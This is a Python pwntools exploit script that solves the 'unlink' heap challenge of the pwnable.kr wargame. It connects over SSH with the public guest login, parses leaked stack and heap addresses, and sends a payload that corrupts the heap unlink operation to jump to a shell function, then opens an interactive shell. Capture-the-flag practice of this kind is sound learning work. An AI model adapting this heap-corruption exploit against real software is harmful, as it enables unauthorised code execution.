import re

from pwn import *

ssh_conn = ssh(
    'unlink',
    'pwnable.kr',
    2222,
    'guest'
)

HEXNUM_RE = re.compile(r'0x[0-9a-f]+')
GET_SHELL_STRING = 'now that you have leaks, get shell!'
SHELL_FUNC = 0x80484eb

unlink_ps = ssh_conn.process(['./unlink'])

data = unlink_ps.recvuntil(GET_SHELL_STRING)

stack, heap = (int(hexstr, 16) for hexstr in re.findall(HEXNUM_RE, data))
print '[+] stack address - {stack}'.format(stack=hex(stack))
print '[+] heap address - {heap}'.format(heap=hex(heap))

unlink_ps.send('A'*16 + p32(heap+0x24) + p32(stack+0x10) + p32(SHELL_FUNC))
unlink_ps.interactive()
